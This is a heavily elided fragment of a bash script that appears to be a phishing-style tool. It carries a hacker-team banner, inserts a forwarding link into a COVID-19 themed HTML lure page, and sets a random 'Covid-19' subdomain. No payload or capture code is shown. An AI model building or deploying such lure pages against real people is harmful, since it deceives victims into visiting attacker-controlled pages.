...
banner() {
    ...
    printf " \n\e[1;39m  MOUSSA-COVID-19- We are a team : FSOCIETY-ARAB-Millia\e[0m \n"
...
sed 's+forwarding_link+'$link'+g' Covid-19.html > index2.html
...
sed 's+forwarding_link+'$send_link'+g' Covid-19.html > index2.html
...
default_subdomain="Covid-19$RANDOM"
